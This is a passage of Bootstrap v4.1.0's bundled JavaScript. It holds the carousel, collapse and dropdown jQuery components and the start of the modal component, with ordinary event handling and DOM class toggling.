            this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval);
          }
        };

        _proto.to = function to(index) {
          var _this = this;

          this._activeElement = $$$1(this._element).find(Selector.ACTIVE_ITEM)[0];

          var activeIndex = this._getItemIndex(this._activeElement);

          if (index > this._items.length - 1 || index < 0) {
            return;
          }

          if (this._isSliding) {
            $$$1(this._element).one(Event.SLID, function () {
              return _this.to(index);
            });
            return;
          }

          if (activeIndex === index) {
            this.pause();
            this.cycle();
            return;
          }

          var direction = index > activeIndex ? Direction.NEXT : Direction.PREV;

          this._slide(direction, this._items[index]);
        };

        _proto.dispose = function dispose() {
          $$$1(this._element).off(EVENT_KEY);
          $$$1.removeData(this._element, DATA_KEY);
          this._items = null;
          this._config = null;
          this._element = null;
          this._interval = null;
          this._isPaused = null;
          this._isSliding = null;
          this._activeElement = null;
          this._indicatorsElement = null;
        }; // Private


        _proto._getConfig = function _getConfig(config) {
          config = _objectSpread({}, Default, config);
          Util.typeCheckConfig(NAME, config, DefaultType);
          return config;
        };

        _proto._addEventListeners = function _addEventListeners() {
          var _this2 = this;

          if (this._config.keyboard) {
            $$$1(this._element).on(Event.KEYDOWN, function (event) {
              return _this2._keydown(event);
            });
          }

          if (this._config.pause === 'hover') {
            $$$1(this._element).on(Event.MOUSEENTER, function (event) {
              return _this2.pause(event);
            }).on(Event.MOUSELEAVE, function (event) {
              return _this2.cycle(event);
            });

            if ('ontouchstart' in document.documentElement) {
              // If it's a touch-enabled device, mouseenter/leave are fired as
              // part of the mouse compatibility events on first tap - the carousel
              // would stop cycling until user tapped out of it;
              // here, we listen for touchend, explicitly pause the carousel
              // (as if it's the second time we tap on it, mouseenter compat event
              // is NOT fired) and after a timeout (to allow for mouse compatibility
              // events to fire) we explicitly restart cycling
              $$$1(this._element).on(Event.TOUCHEND, function () {
                _this2.pause();

                if (_this2.touchTimeout) {
                  clearTimeout(_this2.touchTimeout);
                }

                _this2.touchTimeout = setTimeout(function (event) {
                  return _this2.cycle(event);
                }, TOUCHEVENT_COMPAT_WAIT + _this2._config.interval);
              });
            }
          }
        };

        _proto._keydown = function _keydown(event) {
          if (/input|textarea/i.test(event.target.tagName)) {
            return;
          }

          switch (event.which) {
            case ARROW_LEFT_KEYCODE:
              event.preventDefault();
              this.prev();
              break;

            case ARROW_RIGHT_KEYCODE:
              event.preventDefault();
              this.next();
              break;

            default:
          }
        };

        _proto._getItemIndex = function _getItemIndex(element) {
          this._items = $$$1.makeArray($$$1(element).parent().find(Selector.ITEM));
          return this._items.indexOf(element);
        };

        _proto._getItemByDirection = function _getItemByDirection(direction, activeElement) {
          var isNextDirection = direction === Direction.NEXT;
          var isPrevDirection = direction === Direction.PREV;

          var activeIndex = this._getItemIndex(activeElement);

          var lastItemIndex = this._items.length - 1;
          var isGoingToWrap = isPrevDirection && activeIndex === 0 || isNextDirection && activeIndex === lastItemIndex;

          if (isGoingToWrap && !this._config.wrap) {
            return activeElement;
          }

          var delta = direction === Direction.PREV ? -1 : 1;
          var itemIndex = (activeIndex + delta) % this._items.length;
          return itemIndex === -1 ? this._items[this._items.length - 1] : this._items[itemIndex];
        };

        _proto._triggerSlideEvent = function _triggerSlideEvent(relatedTarget, eventDirectionName) {
          var targetIndex = this._getItemIndex(relatedTarget);

          var fromIndex = this._getItemIndex($$$1(this._element).find(Selector.ACTIVE_ITEM)[0]);

          var slideEvent = $$$1.Event(Event.SLIDE, {
            relatedTarget: relatedTarget,
            direction: eventDirectionName,
            from: fromIndex,
            to: targetIndex
          });
          $$$1(this._element).trigger(slideEvent);
          return slideEvent;
        };

        _proto._setActiveIndicatorElement = function _setActiveIndicatorElement(element) {
          if (this._indicatorsElement) {
            $$$1(this._indicatorsElement).find(Selector.ACTIVE).removeClass(ClassName.ACTIVE);

            var nextIndicator = this._indicatorsElement.children[this._getItemIndex(element)];

            if (nextIndicator) {
              $$$1(nextIndicator).addClass(ClassName.ACTIVE);
            }
          }
        };

        _proto._slide = function _slide(direction, element) {
          var _this3 = this;

          var activeElement = $$$1(this._element).find(Selector.ACTIVE_ITEM)[0];

          var activeElementIndex = this._getItemIndex(activeElement);

          var nextElement = element || activeElement && this._getItemByDirection(direction, activeElement);

          var nextElementIndex = this._getItemIndex(nextElement);

          var isCycling = Boolean(this._interval);
          var directionalClassName;
          var orderClassName;
          var eventDirectionName;

          if (direction === Direction.NEXT) {
            directionalClassName = ClassName.LEFT;
            orderClassName = ClassName.NEXT;
            eventDirectionName = Direction.LEFT;
          } else {
            directionalClassName = ClassName.RIGHT;
            orderClassName = ClassName.PREV;
            eventDirectionName = Direction.RIGHT;
          }

          if (nextElement && $$$1(nextElement).hasClass(ClassName.ACTIVE)) {
            this._isSliding = false;
            return;
          }

          var slideEvent = this._triggerSlideEvent(nextElement, eventDirectionName);

          if (slideEvent.isDefaultPrevented()) {
            return;
          }

          if (!activeElement || !nextElement) {
            // Some weirdness is happening, so we bail
            return;
          }

          this._isSliding = true;

          if (isCycling) {
            this.pause();
          }

          this._setActiveIndicatorElement(nextElement);

          var slidEvent = $$$1.Event(Event.SLID, {
            relatedTarget: nextElement,
            direction: eventDirectionName,
            from: activeElementIndex,
            to: nextElementIndex
          });

          if ($$$1(this._element).hasClass(ClassName.SLIDE)) {
            $$$1(nextElement).addClass(orderClassName);
            Util.reflow(nextElement);
            $$$1(activeElement).addClass(directionalClassName);
            $$$1(nextElement).addClass(directionalClassName);
            var transitionDuration = Util.getTransitionDurationFromElement(activeElement);
            $$$1(activeElement).one(Util.TRANSITION_END, function () {
              $$$1(nextElement).removeClass(directionalClassName + " " + orderClassName).addClass(ClassName.ACTIVE);
              $$$1(activeElement).removeClass(ClassName.ACTIVE + " " + orderClassName + " " + directionalClassName);
              _this3._isSliding = false;
              setTimeout(function () {
                return $$$1(_this3._element).trigger(slidEvent);
              }, 0);
            }).emulateTransitionEnd(transitionDuration);
          } else {
            $$$1(activeElement).removeClass(ClassName.ACTIVE);
            $$$1(nextElement).addClass(ClassName.ACTIVE);
            this._isSliding = false;
            $$$1(this._element).trigger(slidEvent);
          }

          if (isCycling) {
            this.cycle();
          }
        }; // Static


        Carousel._jQueryInterface = function _jQueryInterface(config) {
          return this.each(function () {
            var data = $$$1(this).data(DATA_KEY);

            var _config = _objectSpread({}, Default, $$$1(this).data());

            if (typeof config === 'object') {
              _config = _objectSpread({}, _config, config);
            }

            var action = typeof config === 'string' ? config : _config.slide;

            if (!data) {
              data = new Carousel(this, _config);
              $$$1(this).data(DATA_KEY, data);
            }

            if (typeof config === 'number') {
              data.to(config);
            } else if (typeof action === 'string') {
              if (typeof data[action] === 'undefined') {
                throw new TypeError("No method named \"" + action + "\"");
              }

              data[action]();
            } else if (_config.interval) {
              data.pause();
              data.cycle();
            }
          });
        };

        Carousel._dataApiClickHandler = function _dataApiClickHandler(event) {
          var selector = Util.getSelectorFromElement(this);

          if (!selector) {
            return;
          }

          var target = $$$1(selector)[0];

          if (!target || !$$$1(target).hasClass(ClassName.CAROUSEL)) {
            return;
          }

          var config = _objectSpread({}, $$$1(target).data(), $$$1(this).data());

          var slideIndex = this.getAttribute('data-slide-to');

          if (slideIndex) {
            config.interval = false;
          }

          Carousel._jQueryInterface.call($$$1(target), config);

          if (slideIndex) {
            $$$1(target).data(DATA_KEY).to(slideIndex);
          }

          event.preventDefault();
        };

        _createClass(Carousel, null, [{
          key: "VERSION",
          get: function get() {
            return VERSION;
          }
        }, {
          key: "Default",
          get: function get() {
            return Default;
          }
        }]);

        return Carousel;
      }();
    /**
     * ------------------------------------------------------------------------
     * Data Api implementation
     * ------------------------------------------------------------------------
     */


    $$$1(document).on(Event.CLICK_DATA_API, Selector.DATA_SLIDE, Carousel._dataApiClickHandler);
    $$$1(window).on(Event.LOAD_DATA_API, function () {
      $$$1(Selector.DATA_RIDE).each(function () {
        var $carousel = $$$1(this);

        Carousel._jQueryInterface.call($carousel, $carousel.data());
      });
    });
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */

    $$$1.fn[NAME] = Carousel._jQueryInterface;
    $$$1.fn[NAME].Constructor = Carousel;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return Carousel._jQueryInterface;
    };

    return Carousel;
  }($);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): collapse.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Collapse = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'collapse';
    var VERSION = '4.1.0';
    var DATA_KEY = 'bs.collapse';
    var EVENT_KEY = "." + DATA_KEY;
    var DATA_API_KEY = '.data-api';
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var Default = {
      toggle: true,
      parent: ''
    };
    var DefaultType = {
      toggle: 'boolean',
      parent: '(string|element)'
    };
    var Event = {
      SHOW: "show" + EVENT_KEY,
      SHOWN: "shown" + EVENT_KEY,
      HIDE: "hide" + EVENT_KEY,
      HIDDEN: "hidden" + EVENT_KEY,
      CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY
    };
    var ClassName = {
      SHOW: 'show',
      COLLAPSE: 'collapse',
      COLLAPSING: 'collapsing',
      COLLAPSED: 'collapsed'
    };
    var Dimension = {
      WIDTH: 'width',
      HEIGHT: 'height'
    };
    var Selector = {
      ACTIVES: '.show, .collapsing',
      DATA_TOGGLE: '[data-toggle="collapse"]'
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var Collapse =
      /*#__PURE__*/
      function () {
        function Collapse(element, config) {
          this._isTransitioning = false;
          this._element = element;
          this._config = this._getConfig(config);
          this._triggerArray = $$$1.makeArray($$$1("[data-toggle=\"collapse\"][href=\"#" + element.id + "\"]," + ("[data-toggle=\"collapse\"][data-target=\"#" + element.id + "\"]")));
          var tabToggles = $$$1(Selector.DATA_TOGGLE);

          for (var i = 0; i < tabToggles.length; i++) {
            var elem = tabToggles[i];
            var selector = Util.getSelectorFromElement(elem);

            if (selector !== null && $$$1(selector).filter(element).length > 0) {
              this._selector = selector;

              this._triggerArray.push(elem);
            }
          }

          this._parent = this._config.parent ? this._getParent() : null;

          if (!this._config.parent) {
            this._addAriaAndCollapsedClass(this._element, this._triggerArray);
          }

          if (this._config.toggle) {
            this.toggle();
          }
        } // Getters


        var _proto = Collapse.prototype;

        // Public
        _proto.toggle = function toggle() {
          if ($$$1(this._element).hasClass(ClassName.SHOW)) {
            this.hide();
          } else {
            this.show();
          }
        };

        _proto.show = function show() {
          var _this = this;

          if (this._isTransitioning || $$$1(this._element).hasClass(ClassName.SHOW)) {
            return;
          }

          var actives;
          var activesData;

          if (this._parent) {
            actives = $$$1.makeArray($$$1(this._parent).find(Selector.ACTIVES).filter("[data-parent=\"" + this._config.parent + "\"]"));

            if (actives.length === 0) {
              actives = null;
            }
          }

          if (actives) {
            activesData = $$$1(actives).not(this._selector).data(DATA_KEY);

            if (activesData && activesData._isTransitioning) {
              return;
            }
          }

          var startEvent = $$$1.Event(Event.SHOW);
          $$$1(this._element).trigger(startEvent);

          if (startEvent.isDefaultPrevented()) {
            return;
          }

          if (actives) {
            Collapse._jQueryInterface.call($$$1(actives).not(this._selector), 'hide');

            if (!activesData) {
              $$$1(actives).data(DATA_KEY, null);
            }
          }

          var dimension = this._getDimension();

          $$$1(this._element).removeClass(ClassName.COLLAPSE).addClass(ClassName.COLLAPSING);
          this._element.style[dimension] = 0;

          if (this._triggerArray.length > 0) {
            $$$1(this._triggerArray).removeClass(ClassName.COLLAPSED).attr('aria-expanded', true);
          }

          this.setTransitioning(true);

          var complete = function complete() {
            $$$1(_this._element).removeClass(ClassName.COLLAPSING).addClass(ClassName.COLLAPSE).addClass(ClassName.SHOW);
            _this._element.style[dimension] = '';

            _this.setTransitioning(false);

            $$$1(_this._element).trigger(Event.SHOWN);
          };

          var capitalizedDimension = dimension[0].toUpperCase() + dimension.slice(1);
          var scrollSize = "scroll" + capitalizedDimension;
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          $$$1(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
          this._element.style[dimension] = this._element[scrollSize] + "px";
        };

        _proto.hide = function hide() {
          var _this2 = this;

          if (this._isTransitioning || !$$$1(this._element).hasClass(ClassName.SHOW)) {
            return;
          }

          var startEvent = $$$1.Event(Event.HIDE);
          $$$1(this._element).trigger(startEvent);

          if (startEvent.isDefaultPrevented()) {
            return;
          }

          var dimension = this._getDimension();

          this._element.style[dimension] = this._element.getBoundingClientRect()[dimension] + "px";
          Util.reflow(this._element);
          $$$1(this._element).addClass(ClassName.COLLAPSING).removeClass(ClassName.COLLAPSE).removeClass(ClassName.SHOW);

          if (this._triggerArray.length > 0) {
            for (var i = 0; i < this._triggerArray.length; i++) {
              var trigger = this._triggerArray[i];
              var selector = Util.getSelectorFromElement(trigger);

              if (selector !== null) {
                var $elem = $$$1(selector);

                if (!$elem.hasClass(ClassName.SHOW)) {
                  $$$1(trigger).addClass(ClassName.COLLAPSED).attr('aria-expanded', false);
                }
              }
            }
          }

          this.setTransitioning(true);

          var complete = function complete() {
            _this2.setTransitioning(false);

            $$$1(_this2._element).removeClass(ClassName.COLLAPSING).addClass(ClassName.COLLAPSE).trigger(Event.HIDDEN);
          };

          this._element.style[dimension] = '';
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          $$$1(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        };

        _proto.setTransitioning = function setTransitioning(isTransitioning) {
          this._isTransitioning = isTransitioning;
        };

        _proto.dispose = function dispose() {
          $$$1.removeData(this._element, DATA_KEY);
          this._config = null;
          this._parent = null;
          this._element = null;
          this._triggerArray = null;
          this._isTransitioning = null;
        }; // Private


        _proto._getConfig = function _getConfig(config) {
          config = _objectSpread({}, Default, config);
          config.toggle = Boolean(config.toggle); // Coerce string values

          Util.typeCheckConfig(NAME, config, DefaultType);
          return config;
        };

        _proto._getDimension = function _getDimension() {
          var hasWidth = $$$1(this._element).hasClass(Dimension.WIDTH);
          return hasWidth ? Dimension.WIDTH : Dimension.HEIGHT;
        };

        _proto._getParent = function _getParent() {
          var _this3 = this;

          var parent = null;

          if (Util.isElement(this._config.parent)) {
            parent = this._config.parent; // It's a jQuery object

            if (typeof this._config.parent.jquery !== 'undefined') {
              parent = this._config.parent[0];
            }
          } else {
            parent = $$$1(this._config.parent)[0];
          }

          var selector = "[data-toggle=\"collapse\"][data-parent=\"" + this._config.parent + "\"]";
          $$$1(parent).find(selector).each(function (i, element) {
            _this3._addAriaAndCollapsedClass(Collapse._getTargetFromElement(element), [element]);
          });
          return parent;
        };

        _proto._addAriaAndCollapsedClass = function _addAriaAndCollapsedClass(element, triggerArray) {
          if (element) {
            var isOpen = $$$1(element).hasClass(ClassName.SHOW);

            if (triggerArray.length > 0) {
              $$$1(triggerArray).toggleClass(ClassName.COLLAPSED, !isOpen).attr('aria-expanded', isOpen);
            }
          }
        }; // Static


        Collapse._getTargetFromElement = function _getTargetFromElement(element) {
          var selector = Util.getSelectorFromElement(element);
          return selector ? $$$1(selector)[0] : null;
        };

        Collapse._jQueryInterface = function _jQueryInterface(config) {
          return this.each(function () {
            var $this = $$$1(this);
            var data = $this.data(DATA_KEY);

            var _config = _objectSpread({}, Default, $this.data(), typeof config === 'object' && config);

            if (!data && _config.toggle && /show|hide/.test(config)) {
              _config.toggle = false;
            }

            if (!data) {
              data = new Collapse(this, _config);
              $this.data(DATA_KEY, data);
            }

            if (typeof config === 'string') {
              if (typeof data[config] === 'undefined') {
                throw new TypeError("No method named \"" + config + "\"");
              }

              data[config]();
            }
          });
        };

        _createClass(Collapse, null, [{
          key: "VERSION",
          get: function get() {
            return VERSION;
          }
        }, {
          key: "Default",
          get: function get() {
            return Default;
          }
        }]);

        return Collapse;
      }();
    /**
     * ------------------------------------------------------------------------
     * Data Api implementation
     * ------------------------------------------------------------------------
     */


    $$$1(document).on(Event.CLICK_DATA_API, Selector.DATA_TOGGLE, function (event) {
      // preventDefault only for <a> elements (which change the URL) not inside the collapsible element
      if (event.currentTarget.tagName === 'A') {
        event.preventDefault();
      }

      var $trigger = $$$1(this);
      var selector = Util.getSelectorFromElement(this);
      $$$1(selector).each(function () {
        var $target = $$$1(this);
        var data = $target.data(DATA_KEY);
        var config = data ? 'toggle' : $trigger.data();

        Collapse._jQueryInterface.call($target, config);
      });
    });
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */

    $$$1.fn[NAME] = Collapse._jQueryInterface;
    $$$1.fn[NAME].Constructor = Collapse;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return Collapse._jQueryInterface;
    };

    return Collapse;
  }($);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): dropdown.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Dropdown = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'dropdown';
    var VERSION = '4.1.0';
    var DATA_KEY = 'bs.dropdown';
    var EVENT_KEY = "." + DATA_KEY;
    var DATA_API_KEY = '.data-api';
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var ESCAPE_KEYCODE = 27; // KeyboardEvent.which value for Escape (Esc) key

    var SPACE_KEYCODE = 32; // KeyboardEvent.which value for space key

    var TAB_KEYCODE = 9; // KeyboardEvent.which value for tab key

    var ARROW_UP_KEYCODE = 38; // KeyboardEvent.which value for up arrow key

    var ARROW_DOWN_KEYCODE = 40; // KeyboardEvent.which value for down arrow key

    var RIGHT_MOUSE_BUTTON_WHICH = 3; // MouseEvent.which value for the right button (assuming a right-handed mouse)

    var REGEXP_KEYDOWN = new RegExp(ARROW_UP_KEYCODE + "|" + ARROW_DOWN_KEYCODE + "|" + ESCAPE_KEYCODE);
    var Event = {
      HIDE: "hide" + EVENT_KEY,
      HIDDEN: "hidden" + EVENT_KEY,
      SHOW: "show" + EVENT_KEY,
      SHOWN: "shown" + EVENT_KEY,
      CLICK: "click" + EVENT_KEY,
      CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY,
      KEYDOWN_DATA_API: "keydown" + EVENT_KEY + DATA_API_KEY,
      KEYUP_DATA_API: "keyup" + EVENT_KEY + DATA_API_KEY
    };
    var ClassName = {
      DISABLED: 'disabled',
      SHOW: 'show',
      DROPUP: 'dropup',
      DROPRIGHT: 'dropright',
      DROPLEFT: 'dropleft',
      MENURIGHT: 'dropdown-menu-right',
      MENULEFT: 'dropdown-menu-left',
      POSITION_STATIC: 'position-static'
    };
    var Selector = {
      DATA_TOGGLE: '[data-toggle="dropdown"]',
      FORM_CHILD: '.dropdown form',
      MENU: '.dropdown-menu',
      NAVBAR_NAV: '.navbar-nav',
      VISIBLE_ITEMS: '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)'
    };
    var AttachmentMap = {
      TOP: 'top-start',
      TOPEND: 'top-end',
      BOTTOM: 'bottom-start',
      BOTTOMEND: 'bottom-end',
      RIGHT: 'right-start',
      RIGHTEND: 'right-end',
      LEFT: 'left-start',
      LEFTEND: 'left-end'
    };
    var Default = {
      offset: 0,
      flip: true,
      boundary: 'scrollParent',
      reference: 'toggle',
      display: 'dynamic'
    };
    var DefaultType = {
      offset: '(number|string|function)',
      flip: 'boolean',
      boundary: '(string|element)',
      reference: '(string|element)',
      display: 'string'
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var Dropdown =
      /*#__PURE__*/
      function () {
        function Dropdown(element, config) {
          this._element = element;
          this._popper = null;
          this._config = this._getConfig(config);
          this._menu = this._getMenuElement();
          this._inNavbar = this._detectNavbar();

          this._addEventListeners();
        } // Getters


        var _proto = Dropdown.prototype;

        // Public
        _proto.toggle = function toggle() {
          if (this._element.disabled || $$$1(this._element).hasClass(ClassName.DISABLED)) {
            return;
          }

          var parent = Dropdown._getParentFromElement(this._element);

          var isActive = $$$1(this._menu).hasClass(ClassName.SHOW);

          Dropdown._clearMenus();

          if (isActive) {
            return;
          }

          var relatedTarget = {
            relatedTarget: this._element
          };
          var showEvent = $$$1.Event(Event.SHOW, relatedTarget);
          $$$1(parent).trigger(showEvent);

          if (showEvent.isDefaultPrevented()) {
            return;
          } // Disable totally Popper.js for Dropdown in Navbar


          if (!this._inNavbar) {
            /**
             * Check for Popper dependency
             * Popper - https://popper.js.org
             */
            if (typeof Popper === 'undefined') {
              throw new TypeError('Bootstrap dropdown require Popper.js (https://popper.js.org)');
            }

            var referenceElement = this._element;

            if (this._config.reference === 'parent') {
              referenceElement = parent;
            } else if (Util.isElement(this._config.reference)) {
              referenceElement = this._config.reference; // Check if it's jQuery element

              if (typeof this._config.reference.jquery !== 'undefined') {
                referenceElement = this._config.reference[0];
              }
            } // If boundary is not `scrollParent`, then set position to `static`
            // to allow the menu to "escape" the scroll parent's boundaries
            // https://github.com/twbs/bootstrap/issues/24251


            if (this._config.boundary !== 'scrollParent') {
              $$$1(parent).addClass(ClassName.POSITION_STATIC);
            }

            this._popper = new Popper(referenceElement, this._menu, this._getPopperConfig());
          } // If this is a touch-enabled device we add extra
          // empty mouseover listeners to the body's immediate children;
          // only needed because of broken event delegation on iOS
          // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html


          if ('ontouchstart' in document.documentElement && $$$1(parent).closest(Selector.NAVBAR_NAV).length === 0) {
            $$$1(document.body).children().on('mouseover', null, $$$1.noop);
          }

          this._element.focus();

          this._element.setAttribute('aria-expanded', true);

          $$$1(this._menu).toggleClass(ClassName.SHOW);
          $$$1(parent).toggleClass(ClassName.SHOW).trigger($$$1.Event(Event.SHOWN, relatedTarget));
        };

        _proto.dispose = function dispose() {
          $$$1.removeData(this._element, DATA_KEY);
          $$$1(this._element).off(EVENT_KEY);
          this._element = null;
          this._menu = null;

          if (this._popper !== null) {
            this._popper.destroy();

            this._popper = null;
          }
        };

        _proto.update = function update() {
          this._inNavbar = this._detectNavbar();

          if (this._popper !== null) {
            this._popper.scheduleUpdate();
          }
        }; // Private


        _proto._addEventListeners = function _addEventListeners() {
          var _this = this;

          $$$1(this._element).on(Event.CLICK, function (event) {
            event.preventDefault();
            event.stopPropagation();

            _this.toggle();
          });
        };

        _proto._getConfig = function _getConfig(config) {
          config = _objectSpread({}, this.constructor.Default, $$$1(this._element).data(), config);
          Util.typeCheckConfig(NAME, config, this.constructor.DefaultType);
          return config;
        };

        _proto._getMenuElement = function _getMenuElement() {
          if (!this._menu) {
            var parent = Dropdown._getParentFromElement(this._element);

            this._menu = $$$1(parent).find(Selector.MENU)[0];
          }

          return this._menu;
        };

        _proto._getPlacement = function _getPlacement() {
          var $parentDropdown = $$$1(this._element).parent();
          var placement = AttachmentMap.BOTTOM; // Handle dropup

          if ($parentDropdown.hasClass(ClassName.DROPUP)) {
            placement = AttachmentMap.TOP;

            if ($$$1(this._menu).hasClass(ClassName.MENURIGHT)) {
              placement = AttachmentMap.TOPEND;
            }
          } else if ($parentDropdown.hasClass(ClassName.DROPRIGHT)) {
            placement = AttachmentMap.RIGHT;
          } else if ($parentDropdown.hasClass(ClassName.DROPLEFT)) {
            placement = AttachmentMap.LEFT;
          } else if ($$$1(this._menu).hasClass(ClassName.MENURIGHT)) {
            placement = AttachmentMap.BOTTOMEND;
          }

          return placement;
        };

        _proto._detectNavbar = function _detectNavbar() {
          return $$$1(this._element).closest('.navbar').length > 0;
        };

        _proto._getPopperConfig = function _getPopperConfig() {
          var _this2 = this;

          var offsetConf = {};

          if (typeof this._config.offset === 'function') {
            offsetConf.fn = function (data) {
              data.offsets = _objectSpread({}, data.offsets, _this2._config.offset(data.offsets) || {});
              return data;
            };
          } else {
            offsetConf.offset = this._config.offset;
          }

          var popperConfig = {
            placement: this._getPlacement(),
            modifiers: {
              offset: offsetConf,
              flip: {
                enabled: this._config.flip
              },
              preventOverflow: {
                boundariesElement: this._config.boundary
              }
            } // Disable Popper.js if we have a static display

          };

          if (this._config.display === 'static') {
            popperConfig.modifiers.applyStyle = {
              enabled: false
            };
          }

          return popperConfig;
        }; // Static


        Dropdown._jQueryInterface = function _jQueryInterface(config) {
          return this.each(function () {
            var data = $$$1(this).data(DATA_KEY);

            var _config = typeof config === 'object' ? config : null;

            if (!data) {
              data = new Dropdown(this, _config);
              $$$1(this).data(DATA_KEY, data);
            }

            if (typeof config === 'string') {
              if (typeof data[config] === 'undefined') {
                throw new TypeError("No method named \"" + config + "\"");
              }

              data[config]();
            }
          });
        };

        Dropdown._clearMenus = function _clearMenus(event) {
          if (event && (event.which === RIGHT_MOUSE_BUTTON_WHICH || event.type === 'keyup' && event.which !== TAB_KEYCODE)) {
            return;
          }

          var toggles = $$$1.makeArray($$$1(Selector.DATA_TOGGLE));

          for (var i = 0; i < toggles.length; i++) {
            var parent = Dropdown._getParentFromElement(toggles[i]);

            var context = $$$1(toggles[i]).data(DATA_KEY);
            var relatedTarget = {
              relatedTarget: toggles[i]
            };

            if (!context) {
              continue;
            }

            var dropdownMenu = context._menu;

            if (!$$$1(parent).hasClass(ClassName.SHOW)) {
              continue;
            }

            if (event && (event.type === 'click' && /input|textarea/i.test(event.target.tagName) || event.type === 'keyup' && event.which === TAB_KEYCODE) && $$$1.contains(parent, event.target)) {
              continue;
            }

            var hideEvent = $$$1.Event(Event.HIDE, relatedTarget);
            $$$1(parent).trigger(hideEvent);

            if (hideEvent.isDefaultPrevented()) {
              continue;
            } // If this is a touch-enabled device we remove the extra
            // empty mouseover listeners we added for iOS support


            if ('ontouchstart' in document.documentElement) {
              $$$1(document.body).children().off('mouseover', null, $$$1.noop);
            }

            toggles[i].setAttribute('aria-expanded', 'false');
            $$$1(dropdownMenu).removeClass(ClassName.SHOW);
            $$$1(parent).removeClass(ClassName.SHOW).trigger($$$1.Event(Event.HIDDEN, relatedTarget));
          }
        };

        Dropdown._getParentFromElement = function _getParentFromElement(element) {
          var parent;
          var selector = Util.getSelectorFromElement(element);

          if (selector) {
            parent = $$$1(selector)[0];
          }

          return parent || element.parentNode;
        }; // eslint-disable-next-line complexity


        Dropdown._dataApiKeydownHandler = function _dataApiKeydownHandler(event) {
          // If not input/textarea:
          //  - And not a key in REGEXP_KEYDOWN => not a dropdown command
          // If input/textarea:
          //  - If space key => not a dropdown command
          //  - If key is other than escape
          //    - If key is not up or down => not a dropdown command
          //    - If trigger inside the menu => not a dropdown command
          if (/input|textarea/i.test(event.target.tagName) ? event.which === SPACE_KEYCODE || event.which !== ESCAPE_KEYCODE && (event.which !== ARROW_DOWN_KEYCODE && event.which !== ARROW_UP_KEYCODE || $$$1(event.target).closest(Selector.MENU).length) : !REGEXP_KEYDOWN.test(event.which)) {
            return;
          }

          event.preventDefault();
          event.stopPropagation();

          if (this.disabled || $$$1(this).hasClass(ClassName.DISABLED)) {
            return;
          }

          var parent = Dropdown._getParentFromElement(this);

          var isActive = $$$1(parent).hasClass(ClassName.SHOW);

          if (!isActive && (event.which !== ESCAPE_KEYCODE || event.which !== SPACE_KEYCODE) || isActive && (event.which === ESCAPE_KEYCODE || event.which === SPACE_KEYCODE)) {
            if (event.which === ESCAPE_KEYCODE) {
              var toggle = $$$1(parent).find(Selector.DATA_TOGGLE)[0];
              $$$1(toggle).trigger('focus');
            }

            $$$1(this).trigger('click');
            return;
          }

          var items = $$$1(parent).find(Selector.VISIBLE_ITEMS).get();

          if (items.length === 0) {
            return;
          }

          var index = items.indexOf(event.target);

          if (event.which === ARROW_UP_KEYCODE && index > 0) {
            // Up
            index--;
          }

          if (event.which === ARROW_DOWN_KEYCODE && index < items.length - 1) {
            // Down
            index++;
          }

          if (index < 0) {
            index = 0;
          }

          items[index].focus();
        };

        _createClass(Dropdown, null, [{
          key: "VERSION",
          get: function get() {
            return VERSION;
          }
        }, {
          key: "Default",
          get: function get() {
            return Default;
          }
        }, {
          key: "DefaultType",
          get: function get() {
            return DefaultType;
          }
        }]);

        return Dropdown;
      }();
    /**
     * ------------------------------------------------------------------------
     * Data Api implementation
     * ------------------------------------------------------------------------
     */


    $$$1(document).on(Event.KEYDOWN_DATA_API, Selector.DATA_TOGGLE, Dropdown._dataApiKeydownHandler).on(Event.KEYDOWN_DATA_API, Selector.MENU, Dropdown._dataApiKeydownHandler).on(Event.CLICK_DATA_API + " " + Event.KEYUP_DATA_API, Dropdown._clearMenus).on(Event.CLICK_DATA_API, Selector.DATA_TOGGLE, function (event) {
      event.preventDefault();
      event.stopPropagation();

      Dropdown._jQueryInterface.call($$$1(this), 'toggle');
    }).on(Event.CLICK_DATA_API, Selector.FORM_CHILD, function (e) {
      e.stopPropagation();
    });
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */

    $$$1.fn[NAME] = Dropdown._jQueryInterface;
    $$$1.fn[NAME].Constructor = Dropdown;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return Dropdown._jQueryInterface;
    };

    return Dropdown;
  }($, Popper);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): modal.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Modal = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'modal';
    var VERSION = '4.1.0';
